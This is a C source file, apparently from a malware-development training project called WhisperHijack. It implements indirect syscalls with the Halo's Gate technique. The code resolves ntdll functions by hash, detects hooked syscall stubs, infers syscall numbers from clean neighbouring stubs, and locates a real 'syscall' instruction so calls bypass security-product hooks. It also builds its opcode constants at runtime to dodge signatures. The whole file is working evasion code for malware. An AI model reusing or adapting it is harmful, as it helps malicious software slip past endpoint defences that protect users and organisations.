// Copyright 2026 MalDev Academy
// WhisperHijack - Licensed under the Apache License, Version 2.0 (the "License")
// https://github.com/Maldev-Academy/WhisperHijack

#include "IndirectSyscalling.h"

// From "HashValues.h"
#ifndef CRC32B_NTDLLDLL
#define CRC32B_NTDLLDLL  0xF1BC32A4886F52DD
#endif // !CRC32B_NTDLLDLL


__forceinline USHORT GetSyscallOpcode(void)
{
    // Returns 0x050F  ('syscall' instruction's opcode)
    volatile USHORT v = 0x05;
    v = (v << 8) | 0x0F;
    return v;
}

__forceinline DWORD GetSyscallStubOpcode(void)
{
    // Returns 0xB8D18B4C  ('mov r10,rcx; mov eax, XXXX' opcodes)
    volatile DWORD v = 0xB8;
    v = (v << 8) | 0xD1;
    v = (v << 8) | 0x8B;
    v = (v << 8) | 0x4C;
    return v;
}

//
// Resolves a target Nt* function by hash and prepares an NT_SYSCALL structure
// containing its SSN and a reachable 'syscall' instruction address.
//
// If the target stub is hooked (prologue mangled), falls back to Halo's Gate:
// walks neighboring 32-byte stubs in both directions until a clean one is found,
// then computes the target's SSN by offset since adjacent stubs have sequential SSNs.
//
BOOL InitializeIndirectSyscall(IN DWORD64 dwSyscallNameHash, OUT PNT_SYSCALL pInitializedSyscall)
{
    static HMODULE  hNtdllModule        = NULL;
    PBYTE           pSyscallAddress     = NULL,
                    pNeighborStub       = NULL;     
    USHORT          usSyscallOpcode     = GetSyscallOpcode();
    DWORD           dwSyscallStub       = GetSyscallStubOpcode();
    BOOL            bSsnFound           = FALSE;

    if (!dwSyscallNameHash || !pInitializedSyscall) return FALSE;

    if (!hNtdllModule)
    {
        if (!(hNtdllModule = GetModuleHandleH(CRC32B_NTDLLDLL)))
        {
            DBG("[!] GetModuleHandleH Failed To Resolve NTDLL");
            return FALSE;
        }
    }

    if (!(pSyscallAddress = (PBYTE)GetProcAddressH(hNtdllModule, dwSyscallNameHash)))
    {
        DBG("[!] GetProcAddressH Failed To Resolve: 0x%016I64X", dwSyscallNameHash);
        return FALSE;
    }

    pInitializedSyscall->pSyscallAddress = (PVOID)pSyscallAddress;

    // Check if clean syscall stub: 4C 8B D1 B8 XX XX 00 00
    //   bytes 0..3 : mov r10, rcx ; mov eax, ...   (dwSyscallStub = 0xB8D18B4C)
    //   bytes 4..5 : low  WORD of the SSN immediate
    //   bytes 6..7 : high WORD of the SSN immediate -- always 0x0000 since SSN < 0xFFFF
    if (*(DWORD*)pSyscallAddress == dwSyscallStub && *(WORD*)(pSyscallAddress + 0x06) == 0x0000)
    {
        // +4 to skip: 4C 8B D1 B8
        pInitializedSyscall->dwSSn = *(DWORD*)(pSyscallAddress + 0x04);
        bSsnFound = TRUE;
    }
    else
    {
        // Scan neighbors for clean stub to compute our SSN from it
        for (int wIdx = 1; wIdx <= MAXBYTE; wIdx++)
        {
            // Search in both directions, downward (-1) and upward (+1)
            for (int nDir = -1; nDir <= 1; nDir += 2)
            {
                // Jump to the neighbor stub 'wIdx' positions away in direction 'nDir'
                pNeighborStub = pSyscallAddress + (wIdx * nDir * 32);

                // Check if this neighbor stub is clean
                // +6 to skip: 4C 8B D1 B8 XX XX
                if (*(DWORD*)pNeighborStub == dwSyscallStub && *(WORD*)(pNeighborStub + 0x06) == 0x0000)
                {
                    // Our SSN is the neighbor's SSN adjusted by the distance
                    // +4 to skip: 4C 8B D1 B8
                    pInitializedSyscall->dwSSn = *(DWORD*)(pNeighborStub + 0x04) - (wIdx * nDir);
                    bSsnFound = TRUE;
                    break;
                }
            }

            if (bSsnFound) break;
        }
    }

    if (!bSsnFound) return FALSE;

    // Scan forward from the stub to locate a legitimate 'syscall' instruction 
    for (int dwI = 0; dwI < MAXBYTE; dwI++)
    {
        if (*(WORD*)(pSyscallAddress + dwI) == usSyscallOpcode)
        {
            pInitializedSyscall->pSyscallInstAddress = (PVOID)(pSyscallAddress + dwI);
            return TRUE;
        }
    }

    return FALSE;
}

